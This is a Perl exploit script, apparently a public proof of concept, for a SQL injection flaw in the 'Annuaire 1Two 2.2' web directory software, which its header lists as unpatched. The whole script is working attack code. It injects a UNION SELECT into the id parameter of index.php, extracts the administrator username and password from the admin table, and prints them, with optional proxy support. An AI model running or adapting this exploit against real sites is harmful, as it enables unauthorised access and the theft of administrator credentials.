#!/usr/bin/perl
#
# Affected.scr..: Annuaire 1Two 2.2
# Poc.ID........: 09060902.txt
# Type..........: SQL Injection (without quote)
# Risk.level....: Medium
# Vendor.Status.: Unpatched
# Src.download..: http://www.1two.org/
# Poc.link......: acid-root.new.fr/poc/09060902.txt
# Credits.......: DarkFig
#
#
use LWP::UserAgent;
use HTTP::Request;
use Getopt::Long;
use strict;


print STDOUT "\n+", '-' x 53, "+\n";
print STDOUT "|    Annuaire 1Two 2.2 Remote SQL Injection Exploit   |\n";
print STDOUT '+', '-' x 53, "+\n";

my($host,$path,$proxh,$proxu,$proxp,);
my $opt = GetOptions(
   'host=s'   =>  \$host,
   'path=s'   =>  \$path,
   'proxh=s'  =>  \$proxh,
   'proxu=s'  =>  \$proxu,
   'proxp=s'  =>  \$proxp);

if(!$host) {
    print STDOUT "| Usage: ./xx.pl --host=[www] --path=[/] [Options]    |\n";
    print STDOUT "| [Options] --proxh=[ip] --proxu=[user] --proxp=[pwd] |\n";
    print STDOUT '+', '-' x 53, "+\n";
    exit(0);
}

if(!$path) {$path  = '/';}
if($host  !~ /http/) {$host  = 'http://'.$host;}
if($proxh !~ /http/ && $proxh != '') {$proxh = 'http://'.$proxh.'/';}

my @fi = ('username', 'password');
my $ur = $host.$path.'index.php?id=';
my $ua = LWP::UserAgent->new();
   $ua->agent('Mozilla XD');
   $ua->timeout(30);
   $ua->proxy(['http'] => $proxh) if $proxh;

foreach(@fi) {
my $xx = $_;
my $re = HTTP::Request->new(GET =>  $ur."-1 UNION SELECT $xx FROM 1two_annuaire_admin");
   $re->proxy_authorization_basic($proxu, $proxp) if $proxp;
my $xd = $ua->request($re);
my $da = $xd->content;

if($da =~ /- (.*?)<\/title>/) {
      if($xx eq 'username') {
            print STDOUT " [+]User:";}
      if($xx eq 'password') {
            print STDOUT " [+]Passwd:";}
      print STDOUT " $1\n";
} else {
  print STDOUT "[!]Exploit failed\n";
}}
print STDOUT "+", '-' x 53, "+\n";
exit(0);
